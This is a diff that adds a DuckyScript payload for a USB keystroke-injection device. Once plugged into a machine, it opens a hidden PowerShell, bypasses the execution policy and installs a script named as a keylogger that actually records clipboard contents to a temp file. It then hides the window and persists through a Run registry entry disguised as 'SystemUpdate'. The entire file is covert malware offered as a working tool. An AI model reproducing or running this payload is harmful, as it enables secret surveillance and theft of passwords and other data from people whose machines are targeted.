@@ -1,0 +1,43 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Install keylogger
+STRING $KeyloggerPath = "$env:TEMP\keylogger.ps1"
+ENTER
+DELAY 500
+STRING $KeyloggerCode = @"
+`$logPath = "`$env:TEMP\keystrokes.log"
+`$lastInput = ""
+while (`$true) {
+    `$currentInput = (Get-Clipboard -Raw -ErrorAction SilentlyContinue)
+    if (`$currentInput -and `$currentInput -ne `$lastInput) {
+        "`$currentInput" | Out-File -FilePath `$logPath -Append
+        `$lastInput = `$currentInput
+    }
+    Start-Sleep -Milliseconds 100
+}
+"@
+ENTER
+DELAY 500
+STRING $KeyloggerCode | Out-File -FilePath $KeyloggerPath -Force
+ENTER
+DELAY 500
+STRING Start-Job -ScriptBlock { & $KeyloggerPath } -Name KeyloggerJob
+ENTER
+DELAY 500
+REM Add to startup
+STRING New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemUpdate" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Start-Job -ScriptBlock { & \`$env:TEMP\keylogger.ps1 } -Name KeyloggerJob`"" -Force
+ENTER
+DELAY 500
+REM Hide PowerShell window
+STRING Add-Type -Name User32 -Namespace Win32 -MemberDefinition @"
+[DllImport("user32.dll")]
+public static extern int ShowWindow(int hwnd, int nCmdShow);
+"@
+ENTER
+DELAY 500
+STRING [Win32.User32]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess()).MainWindowHandle, 0)
+ENTER
